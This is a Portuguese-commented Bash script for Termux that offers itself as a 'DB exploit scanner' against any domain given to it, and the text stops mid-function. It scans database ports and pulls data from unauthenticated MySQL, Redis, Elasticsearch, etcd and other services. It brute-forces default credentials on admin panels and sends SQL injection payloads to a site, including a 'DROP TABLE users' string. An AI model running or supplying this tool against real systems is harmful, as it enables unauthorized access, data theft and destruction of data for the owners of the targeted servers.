#!/data/data/com.termux/files/usr/bin/bash

# ================================================================
#   ULTRA RECON + DB EXPLOIT SCANNER v3.0 - Termux
#   IP Real • Subdomínios • WAF • Portas • DB Vulnerável • URLs
# ================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
ORANGE='\033[0;33m'
WHITE='\033[1;37m'
BOLD='\033[1m'
BLINK='\033[5m'
BG_RED='\033[41m'
BG_GREEN='\033[42m'
NC='\033[0m'

LOG_FILE=""
DOMAIN=""
MAIN_IP=""
IPV4=""
IPV6=""
DB_VULNS=()
OPEN_PORTS=()

banner() {
clear
echo -e "${RED}"
cat << 'EOF'
 ██████╗ ██████╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
 ██╔══██╗██╔══██╗    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ██║  ██║██████╔╝    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██║  ██║██╔══██╗    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ██████╔╝██████╔╝    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
 ╚═════╝ ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
EOF
echo -e "${NC}"
echo -e "${CYAN}        ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗${NC}"
echo -e "${CYAN}        ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║${NC}"
echo -e "${CYAN}        ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║${NC}"
echo -e "${CYAN}        ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║${NC}"
echo -e "${CYAN}        ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║${NC}"
echo -e "${CYAN}        ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝${NC}"
echo ""
echo -e "${YELLOW}  ════════════════════════════════════════════════════════${NC}"
echo -e "${WHITE}   🔥 DB HUNTER + FULL OSINT RECON v3.0 - Termux Edition${NC}"
echo -e "${RED}   ⚠  Detecta DBs Expostos, URLs Vulneráveis, IPs Ocultos${NC}"
echo -e "${YELLOW}  ════════════════════════════════════════════════════════${NC}"
echo ""
}

section() {
  echo -e "\n${WHITE}╔══════════════════════════════════════════════════════════╗${NC}"
  printf "${WHITE}║${NC} ${CYAN}${BOLD} %-54s${NC} ${WHITE}║${NC}\n" "$1"
  echo -e "${WHITE}╚══════════════════════════════════════════════════════════╝${NC}"
}

info()    { echo -e "  ${GREEN}[+]${NC} $1"; echo "[+] $(echo $1 | sed 's/\x1b\[[0-9;]*m//g')" >> "$LOG_FILE" 2>/dev/null; }
warn()    { echo -e "  ${YELLOW}[!]${NC} $1"; echo "[!] $(echo $1 | sed 's/\x1b\[[0-9;]*m//g')" >> "$LOG_FILE" 2>/dev/null; }
found()   { echo -e "  ${BG_RED}${WHITE}[★ VULN]${NC} ${RED}${BOLD}$1${NC}"; echo "[★ VULN] $(echo $1 | sed 's/\x1b\[[0-9;]*m//g')" >> "$LOG_FILE" 2>/dev/null; }
critical(){ echo -e "\n  ${BLINK}${BG_RED}${WHITE} ⚡ CRÍTICO ⚡ ${NC} ${RED}${BOLD}$1${NC}\n"; echo "[⚡ CRÍTICO] $(echo $1 | sed 's/\x1b\[[0-9;]*m//g')" >> "$LOG_FILE" 2>/dev/null; }
url_vuln(){ echo -e "  ${PURPLE}[🔗 URL]${NC} ${CYAN}$1${NC}"; echo "[🔗 URL] $1" >> "$LOG_FILE" 2>/dev/null; }
subinfo() { echo -e "  ${BLUE}[>]${NC} $1"; }
ok()      { echo -e "  ${BG_GREEN}${WHITE}[ OK ]${NC} $1"; }

check_deps() {
  section "⚙  INSTALANDO DEPENDÊNCIAS"
  pkg update -y &>/dev/null
  for dep in curl dig whois nmap host traceroute wget python3 openssl netcat-openbsd; do
    if ! command -v "$dep" &>/dev/null; then
      warn "Instalando $dep..."
      pkg install "$dep" -y &>/dev/null
    else
      ok "$dep"
    fi
  done
  pip install requests 2>/dev/null &>/dev/null
}

init_log() {
  LOG_FILE="$HOME/recon_${DOMAIN}_$(date +%Y%m%d_%H%M%S).log"
  echo "RECON DB HUNTER - $DOMAIN - $(date)" > "$LOG_FILE"
  echo "================================================" >> "$LOG_FILE"
  info "Log iniciado: ${CYAN}$LOG_FILE${NC}"
}

resolve_target() {
  TARGET="$1"
  DOMAIN=$(echo "$TARGET" | sed 's~https\?://~~' | sed 's~www\.~~' | cut -d'/' -f1 | tr '[:upper:]' '[:lower:]')
  FULL_URL="https://$DOMAIN"
  section "🎯 ALVO: $DOMAIN"
  info "Domínio: ${YELLOW}$DOMAIN${NC}"

  IPV4=$(dig +short "$DOMAIN" A 2>/dev/null)
  IPV6=$(dig +short "$DOMAIN" AAAA 2>/dev/null)
  MAIN_IP=$(echo "$IPV4" | head -n1)

  if [ -z "$MAIN_IP" ]; then
    warn "Tentando resolver via host..."
    MAIN_IP=$(host "$DOMAIN" 2>/dev/null | grep "has address" | head -1 | awk '{print $NF}')
  fi

  [ -z "$MAIN_IP" ] && echo -e "${RED}[!] Não foi possível resolver o alvo.${NC}" && exit 1

  info "IP Principal: ${YELLOW}$MAIN_IP${NC}"
  echo "$IPV4" | while read ip; do subinfo "IPv4: $ip"; done
  echo "$IPV6" | while read ip; do subinfo "IPv6: $ip"; done
}

# ================================================================
#  MÓDULO DB - SCANNER DE DATABASES EXPOSTOS (CORE)
# ================================================================

db_port_scanner() {
  section "💀 [DB-1] SCAN PORTAS DATABASE (DETALHADO)"

  declare -A DB_PORTS=(
    [3306]="MySQL/MariaDB"
    [5432]="PostgreSQL"
    [27017]="MongoDB"
    [27018]="MongoDB Secundário"
    [27019]="MongoDB Configuração"
    [6379]="Redis"
    [6380]="Redis TLS"
    [9200]="Elasticsearch HTTP"
    [9300]="Elasticsearch Transport"
    [5984]="CouchDB"
    [8529]="ArangoDB"
    [7474]="Neo4j HTTP"
    [7687]="Neo4j Bolt"
    [9042]="Cassandra CQL"
    [7000]="Cassandra Internode"
    [7001]="Cassandra TLS"
    [2181]="Zookeeper"
    [2888]="Zookeeper Leader"
    [3888]="Zookeeper Election"
    [11211]="Memcached"
    [4369]="RabbitMQ/Erlang"
    [5672]="RabbitMQ AMQP"
    [15672]="RabbitMQ Management"
    [1433]="Microsoft SQL Server"
    [1434]="MSSQL Browser"
    [1521]="Oracle DB"
    [1830]="Oracle DB Alt"
    [50000]="DB2 IBM"
    [8086]="InfluxDB"
    [8088]="InfluxDB Admin"
    [4000]="CouchDB Alt"
    [5433]="PostgreSQL Alt"
    [3307]="MySQL Alt"
    [33060]="MySQL X Protocol"
    [28015]="RethinkDB"
    [29015]="RethinkDB Admin"
    [8983]="Apache Solr"
    [9090]="Prometheus"
    [3000]="Grafana"
    [8080]="PhpMyAdmin/Adminer"
    [8888]="Jupyter/DB Admin"
    [4444]="DB Proxy"
    [6432]="PgBouncer"
    [5601]="Kibana"
    [9600]="Logstash"
    [19000]="Clickhouse TCP"
    [8123]="Clickhouse HTTP"
    [2379]="etcd"
    [2380]="etcd Peer"
  )

  info "Escaneando ${#DB_PORTS[@]} portas de database em $MAIN_IP..."
  echo ""

  for port in "${!DB_PORTS[@]}"; do
    SERVICE="${DB_PORTS[$port]}"
    # Tenta conexão TCP rápida
    RESULT=$(timeout 2 bash -c "echo >/dev/tcp/$MAIN_IP/$port" 2>/dev/null && echo "OPEN")
    if [ "$RESULT" = "OPEN" ]; then
      OPEN_PORTS+=("$port")
      found "PORTA ABERTA: $port ($SERVICE) em $MAIN_IP"
      db_vuln_check "$port" "$SERVICE" "$MAIN_IP"
    fi
  done

  if [ ${#OPEN_PORTS[@]} -eq 0 ]; then
    info "Nenhuma porta de DB aberta diretamente no IP principal"
    warn "Tentando com nmap stealth scan..."
    nmap_db_scan
  fi
}

nmap_db_scan() {
  PORTS="3306,5432,27017,27018,27019,6379,9200,9300,5984,1433,1521,11211,8086,28015,8983,5601,9090,3000,8888,8080,8529,7474,9042,19000,8123,2379,6432"
  info "nmap scan em $MAIN_IP nas portas DB..."
  NMAP_OUT=$(nmap -sV --open -T4 -p "$PORTS" "$MAIN_IP" 2>/dev/null)

  echo "$NMAP_OUT" | grep "open" | while read line; do
    PORT=$(echo "$line" | awk '{print $1}' | cut -d'/' -f1)
    SERVICE=$(echo "$line" | awk '{print $3,$4,$5}')
    found "nmap: Porta $PORT aberta - $SERVICE"
    OPEN_PORTS+=("$PORT")
    db_vuln_check_nmap "$PORT" "$SERVICE"
  done
}

db_vuln_check() {
  PORT="$1"
  SERVICE="$2"
  IP="$3"

  case "$PORT" in

    # ── MySQL ────────────────────────────────────────────────
    3306|3307|33060)
      critical "$SERVICE EXPOSTO NA INTERNET! ($IP:$PORT)"
      url_vuln "mysql://$IP:$PORT"
      url_vuln "http://$DOMAIN/phpmyadmin"
      url_vuln "http://$DOMAIN/phpmyadmin/"
      url_vuln "http://$DOMAIN/pma"
      url_vuln "http://$DOMAIN/mysql"
      url_vuln "http://$DOMAIN/db/phpmyadmin"
      url_vuln "http://$DOMAIN/web/phpmyadmin"
      url_vuln "http://$DOMAIN:8080/phpmyadmin"

      # Banner grab MySQL
      BANNER=$(timeout 3 bash -c "cat /dev/tcp/$IP/$PORT 2>/dev/null" | strings | head -c 200)
      [ -n "$BANNER" ] && found "MySQL Banner: $BANNER"

      # Testar acesso sem senha
      if command -v mysql &>/dev/null; then
        ANON=$(timeout 5 mysql -h "$IP" -P "$PORT" -u root --password= -e "show databases;" 2>&1)
        if echo "$ANON" | grep -qi "database\|mysql\|schema"; then
          critical "MySQL SEM SENHA! Login root anônimo funcionou!"
          echo "$ANON" | head -10 | while read db; do found "DB encontrado: $db"; done
        fi
      fi
      ;;

    # ── PostgreSQL ───────────────────────────────────────────
    5432|5433|6432)
      critical "$SERVICE EXPOSTO! ($IP:$PORT)"
      url_vuln "postgresql://$IP:$PORT"
      url_vuln "http://$DOMAIN/pgadmin"
      url_vuln "http://$DOMAIN/pgadmin4"
      url_vuln "http://$DOMAIN:5050"
      url_vuln "http://$IP:5050"

      # Banner grab
      BANNER=$(echo -e "\x00\x00\x00\x08\x04\xd2\x16\x2f" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | strings | head -c 100)
      [ -n "$BANNER" ] && found "PostgreSQL Banner: $BANNER"
      ;;

    # ── MongoDB ──────────────────────────────────────────────
    27017|27018|27019)
      critical "MongoDB EXPOSTO SEM AUTH! ($IP:$PORT) - CRÍTICO!"
      url_vuln "mongodb://$IP:$PORT"
      url_vuln "http://$IP:28017"
      url_vuln "http://$IP:28017/_status"
      url_vuln "http://$IP:28017/serverStatus"

      # Mongo HTTP interface (versões antigas)
      MONGO_HTTP=$(curl -s --max-time 5 "http://$IP:28017/" 2>/dev/null)
      if echo "$MONGO_HTTP" | grep -qi "mongo\|listing"; then
        critical "MongoDB HTTP Interface ABERTA em $IP:28017!"
        url_vuln "http://$IP:28017/listDatabases"
        url_vuln "http://$IP:28017/admin/\$cmd?listDatabases=1"
      fi

      # Testar via curl REST
      MONGO_TEST=$(curl -s --max-time 5 "http://$IP:28017/" 2>/dev/null | head -200)
      [ -n "$MONGO_TEST" ] && found "MongoDB HTTP responde: exposto!"
      ;;

    # ── Redis ────────────────────────────────────────────────
    6379|6380)
      critical "Redis EXPOSTO! ($IP:$PORT) - SEM AUTH = ACESSO TOTAL!"
      url_vuln "redis://$IP:$PORT"

      # Tentar PING no Redis
      REDIS_PING=$(echo -e "*1\r\n\$4\r\nPING\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null)
      if echo "$REDIS_PING" | grep -qi "PONG\|+OK"; then
        critical "Redis responde PONG - ACESSO SEM AUTENTICAÇÃO!"
        url_vuln "redis://$IP:$PORT (SEM SENHA!)"

        # Tentar INFO
        REDIS_INFO=$(echo -e "*1\r\n\$4\r\nINFO\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | head -20)
        [ -n "$REDIS_INFO" ] && found "Redis INFO: $REDIS_INFO"

        # Tentar CONFIG GET
        REDIS_CONF=$(echo -e "*3\r\n\$6\r\nCONFIG\r\n\$3\r\nGET\r\n\$3\r\ndir\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | strings)
        [ -n "$REDIS_CONF" ] && found "Redis CONFIG: $REDIS_CONF"
      fi
      ;;

    # ── Elasticsearch ────────────────────────────────────────
    9200|9300)
      critical "Elasticsearch EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:9200"
      url_vuln "http://$IP:9200/_cat/indices"
      url_vuln "http://$IP:9200/_cat/nodes"
      url_vuln "http://$IP:9200/_cluster/health"
      url_vuln "http://$IP:9200/_all/_search"
      url_vuln "http://$IP:9200/_nodes"

      # Testar acesso
      ES_TEST=$(curl -s --max-time 5 "http://$IP:9200/" 2>/dev/null)
      if echo "$ES_TEST" | grep -qi "cluster_name\|version\|elasticsearch"; then
        critical "Elasticsearch SEM AUTH! Dados públicos!"
        CLUSTER=$(echo "$ES_TEST" | grep -o '"cluster_name":"[^"]*"' | cut -d'"' -f4)
        VERSION=$(echo "$ES_TEST" | grep -o '"number":"[^"]*"' | cut -d'"' -f4)
        found "Cluster: $CLUSTER | Versão: $VERSION"

        # Listar índices
        INDICES=$(curl -s --max-time 5 "http://$IP:9200/_cat/indices?v" 2>/dev/null | head -20)
        [ -n "$INDICES" ] && found "ÍNDICES ES: $INDICES"
      fi
      ;;

    # ── CouchDB ──────────────────────────────────────────────
    5984|4000)
      critical "CouchDB EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:$PORT"
      url_vuln "http://$IP:$PORT/_all_dbs"
      url_vuln "http://$IP:$PORT/_utils"
      url_vuln "http://$IP:$PORT/_config"

      COUCH=$(curl -s --max-time 5 "http://$IP:$PORT/" 2>/dev/null)
      if echo "$COUCH" | grep -qi "couchdb\|welcome"; then
        critical "CouchDB acessível! Verificando databases..."
        COUCH_DBS=$(curl -s --max-time 5 "http://$IP:$PORT/_all_dbs" 2>/dev/null)
        [ -n "$COUCH_DBS" ] && found "CouchDB DBs: $COUCH_DBS"
      fi
      ;;

    # ── Memcached ────────────────────────────────────────────
    11211)
      critical "Memcached EXPOSTO! ($IP:$PORT) - Risco de amplificação DDoS!"
      url_vuln "memcached://$IP:$PORT"

      MEM_STATS=$(echo "stats" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | head -20)
      if [ -n "$MEM_STATS" ]; then
        critical "Memcached SEM AUTH! Stats acessíveis:"
        echo "$MEM_STATS" | head -10 | while read stat; do found "  $stat"; done
      fi
      ;;

    # ── MSSQL ────────────────────────────────────────────────
    1433|1434)
      critical "Microsoft SQL Server EXPOSTO! ($IP:$PORT)"
      url_vuln "mssql://$IP:$PORT"
      url_vuln "http://$DOMAIN/reportserver"
      url_vuln "http://$DOMAIN/reports"
      url_vuln "http://$DOMAIN:8080/reportserver"

      # Banner grab
      MSSQL_BANNER=$(timeout 3 bash -c "cat /dev/tcp/$IP/$PORT 2>/dev/null" | strings | head -c 100)
      [ -n "$MSSQL_BANNER" ] && found "MSSQL Banner: $MSSQL_BANNER"
      ;;

    # ── Oracle ───────────────────────────────────────────────
    1521|1830)
      critical "Oracle Database EXPOSTO! ($IP:$PORT)"
      url_vuln "oracle://$IP:$PORT"
      ;;

    # ── Kibana ───────────────────────────────────────────────
    5601)
      critical "Kibana EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:5601"
      url_vuln "http://$IP:5601/api/status"
      url_vuln "http://$IP:5601/app/kibana"

      KIB=$(curl -s --max-time 5 "http://$IP:5601/api/status" 2>/dev/null)
      if echo "$KIB" | grep -qi "kibana\|green\|yellow\|version"; then
        critical "Kibana acessível SEM AUTH! Dashboard Elasticsearch exposto!"
        VERSION=$(echo "$KIB" | grep -o '"number":"[^"]*"' | cut -d'"' -f4)
        found "Kibana Versão: $VERSION"
      fi
      ;;

    # ── Grafana ──────────────────────────────────────────────
    3000)
      critical "Grafana EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:3000"
      url_vuln "http://$IP:3000/login"
      url_vuln "http://$IP:3000/api/dashboards/home"

      GRAF=$(curl -s --max-time 5 "http://$IP:3000/api/health" 2>/dev/null)
      if echo "$GRAF" | grep -qi "ok\|database"; then
        critical "Grafana responde! Tentando login padrão admin:admin..."
        GRAF_AUTH=$(curl -s --max-time 5 -u "admin:admin" "http://$IP:3000/api/org" 2>/dev/null)
        if echo "$GRAF_AUTH" | grep -qi "name\|id"; then
          critical "Grafana: LOGIN ADMIN:ADMIN FUNCIONOU! ACESSO TOTAL!"
          url_vuln "http://$IP:3000 (user: admin | senha: admin)"
        fi
      fi
      ;;

    # ── PhpMyAdmin / Adminer ─────────────────────────────────
    8080|8888)
      warn "Porta $PORT aberta - verificando painéis DB web..."
      for path in phpmyadmin pma adminer db admin/db mysql phpma PMA adminer.php; do
        RESP=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "http://$IP:$PORT/$path" 2>/dev/null)
        if [ "$RESP" = "200" ] || [ "$RESP" = "301" ] || [ "$RESP" = "302" ]; then
          critical "Painel DB encontrado em $IP:$PORT/$path (HTTP $RESP)"
          url_vuln "http://$IP:$PORT/$path"
        fi
      done
      ;;

    # ── InfluxDB ─────────────────────────────────────────────
    8086|8088)
      critical "InfluxDB EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:$PORT"
      url_vuln "http://$IP:$PORT/query?q=SHOW+DATABASES"
      url_vuln "http://$IP:$PORT/debug/vars"

      INFLUX=$(curl -s --max-time 5 "http://$IP:$PORT/ping" 2>/dev/null)
      INFLUX_CODE=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "http://$IP:$PORT/ping" 2>/dev/null)
      if [ "$INFLUX_CODE" = "204" ] || [ "$INFLUX_CODE" = "200" ]; then
        critical "InfluxDB PING OK - SEM AUTH! Databases acessíveis!"
        INFLUX_DBS=$(curl -s --max-time 5 "http://$IP:$PORT/query?q=SHOW%20DATABASES" 2>/dev/null)
        [ -n "$INFLUX_DBS" ] && found "InfluxDB Databases: $INFLUX_DBS"
      fi
      ;;

    # ── Solr ─────────────────────────────────────────────────
    8983)
      critical "Apache Solr EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:8983/solr"
      url_vuln "http://$IP:8983/solr/#/"
      url_vuln "http://$IP:8983/solr/admin/cores"

      SOLR=$(curl -s --max-time 5 "http://$IP:8983/solr/admin/cores?action=STATUS&wt=json" 2>/dev/null)
      if echo "$SOLR" | grep -qi "responseHeader\|status"; then
        critical "Solr acessível! Cores expostos!"
        found "Solr Response: $(echo $SOLR | head -c 200)"
      fi
      ;;

    # ── RethinkDB ────────────────────────────────────────────
    28015|29015)
      critical "RethinkDB EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:8080 (RethinkDB Admin)"
      url_vuln "rethinkdb://$IP:$PORT"
      ;;

    # ── Cassandra ────────────────────────────────────────────
    9042|7000|7001)
      critical "Apache Cassandra EXPOSTO! ($IP:$PORT)"
      url_vuln "cassandra://$IP:$PORT"
      ;;

    # ── Zookeeper ────────────────────────────────────────────
    2181|2888|3888)
      critical "Zookeeper EXPOSTO! ($IP:$PORT)"
      url_vuln "zookeeper://$IP:$PORT"

      ZK=$(echo "ruok" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null)
      [ "$ZK" = "imok" ] && critical "Zookeeper responde 'imok' - SEM AUTH!"

      ZK_STAT=$(echo "stat" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | head -20)
      [ -n "$ZK_STAT" ] && found "Zookeeper STAT: $ZK_STAT"
      ;;

    # ── etcd ─────────────────────────────────────────────────
    2379|2380)
      critical "etcd EXPOSTO! ($IP:$PORT) - Kubernetes secrets em risco!"
      url_vuln "http://$IP:2379/v3/keys"
      url_vuln "http://$IP:2379/v2/keys/"
      url_vuln "http://$IP:2379/v3/cluster/member/list"

      ETCD=$(curl -s --max-time 5 "http://$IP:2379/v3/cluster/member/list" 2>/dev/null)
      if echo "$ETCD" | grep -qi "members\|header"; then
        critical "etcd ACESSÍVEL! Kubernetes secrets EXPOSTOS!"
        url_vuln "http://$IP:2379/v3/kv/range (POST - listar chaves)"
      fi
      ;;

    # ── Neo4j ────────────────────────────────────────────────
    7474|7687)
      critical "Neo4j EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:7474"
      url_vuln "http://$IP:7474/browser/"
      url_vuln "bolt://$IP:7687"

      NEO=$(curl -s --max-time 5 "http://$IP:7474/" 2>/dev/null)
      if echo "$NEO" | grep -qi "neo4j\|bolt"; then
        critical "Neo4j acessível! Tentando auth padrão..."
        NEO_AUTH=$(curl -s --max-time 5 -u "neo4j:neo4j" "http://$IP:7474/db/data/" 2>/dev/null)
        echo "$NEO_AUTH" | grep -qi "neo4j_version\|data" && critical "Neo4j: LOGIN NEO4J:NEO4J FUNCIONOU!"
      fi
      ;;

    # ── RabbitMQ ─────────────────────────────────────────────
    15672)
      critical "RabbitMQ Management EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:15672"
      url_vuln "http://$IP:15672/#/"

      RABBIT=$(curl -s --max-time 5 -u "guest:guest" "http://$IP:15672/api/overview" 2>/dev/null)
      if echo "$RABBIT" | grep -qi "rabbitmq_version\|cluster_name"; then
        critical "RabbitMQ: LOGIN GUEST:GUEST FUNCIONOU!"
        found "RabbitMQ Info: $(echo $RABBIT | grep -o '"rabbitmq_version":"[^"]*"')"
      fi
      ;;

    # ── Prometheus ───────────────────────────────────────────
    9090)
      critical "Prometheus EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:9090"
      url_vuln "http://$IP:9090/metrics"
      url_vuln "http://$IP:9090/api/v1/targets"
      url_vuln "http://$IP:9090/api/v1/query?query=up"

      PROM=$(curl -s --max-time 5 "http://$IP:9090/-/healthy" 2>/dev/null)
      echo "$PROM" | grep -qi "Healthy\|OK" && critical "Prometheus SEM AUTH! Métricas internas expostas!"
      ;;

    # ── ClickHouse ───────────────────────────────────────────
    8123|19000)
      critical "ClickHouse EXPOSTO! ($IP:$PORT)"
      url_vuln "http://$IP:8123"
      url_vuln "http://$IP:8123/?query=SHOW+DATABASES"
      url_vuln "http://$IP:8123/play"

      CH=$(curl -s --max-time 5 "http://$IP:8123/?query=SELECT+1" 2>/dev/null)
      [ "$CH" = "1" ] && critical "ClickHouse SEM AUTH! Query executada com sucesso!"
      ;;

  esac
}

db_vuln_check_nmap() {
  PORT="$1"
  SERVICE="$2"
  db_vuln_check "$PORT" "$SERVICE" "$MAIN_IP"
}

# ================================================================
#  SCAN DE PAINÉIS WEB DE DATABASE
# ================================================================

web_db_panels() {
  section "🌐 [DB-2] PAINÉIS WEB DE DATABASE"

  info "Procurando interfaces web de DB em $DOMAIN e $MAIN_IP..."

  PANEL_PATHS=(
    "phpmyadmin" "pma" "phpma" "PMA" "phpmyadmin/" "phpmyadmin/index.php"
    "adminer" "adminer.php" "adminer/" "db/adminer.php"
    "pgadmin" "pgadmin4" "pgadmin4/browser/"
    "mongo-express" "mongoexpress" "mongo" "mongodb"
    "redis-commander" "rediscommander"
    "kibana" "kibana/" "app/kibana"
    "grafana" "grafana/" "grafana/login"
    "phppgadmin" "phpredisadmin"
    "mysql/" "mysql/index.php"
    "db" "database" "db/" "database/"
    "admin/phpmyadmin" "admin/pma"
    "server/phpmyadmin" "web/phpmyadmin"
    "tools/phpmyadmin" "panel/phpmyadmin"
    "control/phpmyadmin" "portal/phpmyadmin"
    "phpmyadmin2" "pma2" "pma1"
    "mysqlmanager" "mysqladmin"
    "webdb" "dbadmin" "dbmanager"
    "solr" "solr/" "solr/#/"
    "elasticsearch" "_plugin/head" "_cat/indices"
    "influxdb" "influxdb/"
    "rethinkdb" "cockroachdb"
    "cassandra-web" "hbase" "hue"
  )

  for HOST in "$DOMAIN" "$MAIN_IP"; do
    for proto in "http" "https"; do
      for path in "${PANEL_PATHS[@]}"; do
        URL="$proto://$HOST/$path"
        CODE=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
        if [ "$CODE" = "200" ] || [ "$CODE" = "301" ] || [ "$CODE" = "302" ] || [ "$CODE" = "401" ]; then
          if [ "$CODE" = "401" ]; then
            warn "Painel com AUTH ($CODE): $URL"
          else
            critical "Painel DB ENCONTRADO ($CODE): $URL"
            url_vuln "$URL"

            # Detectar tipo e testar default creds
            test_default_creds "$URL" "$path"
          fi
        fi
      done
    done
  done
}

test_default_creds() {
  URL="$1"
  PATH_NAME="$2"

  declare -A DEFAULT_CREDS=(
    ["root"]="root"
    ["root"]=""
    ["admin"]="admin"
    ["admin"]="password"
    ["admin"]="123456"
    ["admin"]="admin123"
    ["admin"]=""
    ["sa"]="sa"
    ["postgres"]="postgres"
    ["mysql"]="mysql"
    ["mongodb"]="mongodb"
    ["elastic"]="elastic"
    ["kibana"]="kibana"
    ["grafana"]="grafana"
    ["guest"]="guest"
    ["user"]="user"
    ["test"]="test"
  )

  subinfo "Testando credenciais padrão em $URL..."
  for user in root admin sa postgres elastic kibana grafana guest; do
    for pass in "" "admin" "password" "123456" "$user" "${user}123" "root" "toor" "changeme"; do
      RESP=$(curl -sk --max-time 3 -c /tmp/cookies.txt -b /tmp/cookies.txt \
        -d "pma_username=$user&pma_password=$pass&pma_servername=localhost" \
        -d "username=$user&password=$pass" \
        -d "user=$user&pass=$pass" \
        -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)

      if [ "$RESP" = "302" ] || [ "$RESP" = "200" ]; then
        # Verificar se redirecionou para dentro (login ok)
        REDIR=$(curl -sk --max-time 3 -c /tmp/cookies.txt -b /tmp/cookies.txt \
          -L "$URL" 2>/dev/null | grep -i "logout\|signout\|dashboard\|welcome\|tables\|databases" | head -1)
        if [ -n "$REDIR" ]; then
          critical "CREDENCIAL PADRÃO FUNCIONOU! $user:$pass em $URL"
          url_vuln "$URL (user: $user | senha: $pass)"
          break 2
        fi
      fi
    done
  done
}

# ================================================================
#  SQL INJECTION DETECTOR
# ================================================================

sqli_scan() {
  section "💉 [DB-3] SQL INJECTION SCANNER"

  info "Buscando parâmetros vulneráveis em $DOMAIN..."

  # Coletar URLs com parâmetros do site
  SITE_URLS=$(curl -sk "$FULL_URL" 2>/dev/null | grep -oE 'href="[^"]*\?[^"]*"' | \
    sed 's/href="//;s/"//' | head -30)

  SQLI_PAYLOADS=(
    "'"
    "''"
    "' OR '1'='1"
    "' OR 1=1--"
    "\" OR 1=1--"
    "' OR 'x'='x"
    "1' AND 1=1--"
    "1; DROP TABLE users--"
    "' UNION SELECT NULL--"
    "admin'--"
    "' OR 1=1#"
    "') OR ('1'='1"
    "1' ORDER BY 1--"
    "1 AND 1=1"
    "1 AND 1=2"
  )

  SQLI_ERRORS=(
    "sql syntax"
    "mysql_fetch"
    "You have an error in your SQL"
    "ORA-01756"
    "PostgreSQL.*ERROR"
    "Warning.*pg_"
    "SQLSTATE"
    "Unclosed quotation mark"
    "Microsoft OLE DB"
    "ODBC SQL Server Driver"
    "SQLServer JDBC Driver"
    "mysql_num_rows"
    "supplied argument is not a valid MySQL"
    "mysqli_fetch"
    "Syntax error.*SQL"
    "DB Error:"
    "database error"
    "sql command not properly ended"
    "Warning.*mysql_"
    "Division by zero"
    "stack trace:"
  )

  # URLs comuns com parâmetros para testar
  COMMON_PARAMS=(
    "id" "page" "cat" "category" "product" "item" "user" "uid"
    "p" "q" "search" "query" "s" "article" "news" "post"
    "lang" "language" "view" "type" "action" "module" "file"
    "name" "key" "token" "ref" "url" "redirect" "return" "path"
  )

  for param in "${COMMON_PARAMS[@]}"; do
    for payload in "${SQLI_PAYLOADS[@]}"; do
      ENC_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null)
      TEST_URL="$FULL_URL/?$param=$ENC_PAYLOAD"
      RESPONSE=$(curl -sk --max-time 5 "$TEST_URL" 2>/dev/null)

      for error in "${SQLI_ERRORS[@]}"; do
        if echo "$RESPONSE" | grep -qi "$error"; then
          critical "SQLi DETECTADO! Param: $param | Payload: $payload"
          url_vuln "$FULL_URL/?$param=$(echo $payload | python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))' 2>/dev/null || echo $payload)"
          break
        fi
      done
    done
  done

  # Testar URLs encontradas no site
  if [ -n "$SITE_URLS" ]; then
    info "Testando URLs com parâmetros encontradas no site..."
    echo "$SITE_URLS" | while read site_url; do
      FULL_SITE_URL="$FULL_URL$site_url"
      for payload in "'" "' OR '1'='1" "1 AND 1=2"; do
        URL_TEST=$(echo "$FULL_SITE_URL" | sed "s/=[^&]*/=$payload/g")
        RESP=$(curl -sk --max-time 5 "$URL_TEST" 2>/dev/null)
        for error in "${SQLI_ERRORS[@]}"; do
          if echo "$RESP" | grep -qi "$error"; then
            critical "SQLi em URL do site: $URL_TEST"
            url_vuln "$URL_TEST"
            break
          fi
        done
      done
    done
  fi
}

# ================================================================
#  MÓDULOS OSINT EXISTENTES
# ================================================================

full_dns() {
  section "📡 DNS + ZONE TRANSFER"
  for TYPE in A AAAA MX NS TXT CNAME SOA CAA SRV; do
    RES=$(dig +short "$DOMAIN" $TYPE 2>/dev/null)
    if [ -n "$RES" ]; then
      info "${YELLOW}[$TYPE]${NC}"; echo "$RES" | while read r; do subinfo "$r"; done
    fi
  done
